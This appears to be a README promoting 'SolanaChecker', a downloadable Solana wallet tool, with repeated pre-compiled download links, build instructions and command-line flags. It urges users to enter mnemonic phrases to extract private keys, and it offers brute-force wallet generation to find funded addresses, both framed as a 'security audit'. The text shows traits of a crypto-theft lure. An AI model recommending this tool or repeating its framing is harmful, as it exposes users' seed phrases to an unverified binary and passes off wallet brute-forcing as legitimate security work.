# Solana Wallet Security Audit: Enhance Your Protection with SolanaChecker

**SolanaChecker** is a versatile tool for the Solana blockchain, designed to help you take control of your wallet security. It provides several functions for checking the status and managing your wallets. You can perform your own Solana Wallet Security Audit.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/asset/map.webp" />
</p>

## Program Features for a Solana Wallet Security Audit

1.  **Check Solana Address Balance:** Quickly check Solana balances.

<p align="left">
    <img src="/asset/side.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess token security, and identify possible fraud.

<p align="left">
    <img src="/asset/inspect.webp" />
</p>

3.  **Track Solana Addresses:** Get real-time notifications.

4.  **Wallet Data from Mnemonic Phrase (Critical for Audits):** Extract private key, address, and balance from your mnemonic phrase. *A key feature that can be used to verify wallet control as part of a security audit.*

<p align="left">
    <img src="/asset/edge.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate new wallets.

<p align="left">
    <img src="/asset/header.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (for Research and Demonstration):** Brute-force to simulate finding vulnerabilities.

<p align="left">
    <img src="/asset/system.webp" />
</p>

## Setting Up Telegram (for Monitoring)

Configure Telegram to receive notifications.

## Getting Started: Download or Build

Download a pre-compiled build or build the project yourself.

## Building the Project: Ensuring Auditability

Building ensures you know what you're running.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** (if you don't have it).
2.  Add vcpkg to your system PATH.
3.  Run these commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure **vcpkg** is correctly integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable is in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure all dependencies are installed.
2.  Compile using (example):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Your Security Toolkit

Use the command line for your audit:

1.  **-s / -search**: Brute-force (for research).
2.  **-t / -track (ADDRESS)**: Track.
3.  **-g / -gen (NUMBER)**: Generate.
4.  **-m / -mnemonic (MNEMONIC)**: *Use this command to verify the private key. Critical for security audits.*
5.  **-b / -balance (ADDRESS)**: Check balance.

## Notes

-   Use responsibly.
-   Protect your data.


  ###[DOWNLOAD FOR WINDOWS & LINUX]

(../../releases)
  
  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## LicenseThis project is licensed under the [MIT License](/LICENSE).